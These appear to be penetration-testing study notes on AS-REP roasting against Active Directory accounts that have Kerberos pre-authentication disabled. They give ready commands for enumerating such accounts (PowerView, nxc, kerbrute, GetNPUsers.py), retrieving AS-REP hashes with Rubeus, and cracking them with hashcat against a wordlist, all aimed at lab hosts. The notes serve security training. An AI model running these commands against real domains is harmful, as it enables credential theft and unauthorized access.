- Kerberos Pre-authentication disabled
- obtain the TGT for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled
- service accounts can be configured this way
- The auth service reply (**AS_REP**) is encrypted with the accounts password and any domain user can request it.
- ![](/attachments/Pasted-image-20250228230547.png)
- **ASREPRoasting** is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. 
	- An SPN is not required. 
	- This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
- ![](/attachments/Pasted-image-20250228230655.png)

## If in Domain
### Enum DONT_REQ_PREAUTH - Windows
- `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`
	- returns an accountname, principalname
### Retrieve ASREP using Rubeus
- `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`
### Crack ASREP Hashes
- `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`

<hr>

## If on Linux
### Retrieving the AS-REP using Kerbrute - Linux
- When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
- `nxc smb 10.129.95.210 -u users.txt -p pass.txt -k`
	- will show users that are vulnerable to asrep roasting
- `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
	- will provide a list of valid usernames and the user with ASREP and its hash
### Hunt for users with Kerberoast Pre-auth no required
- `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`
- `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`

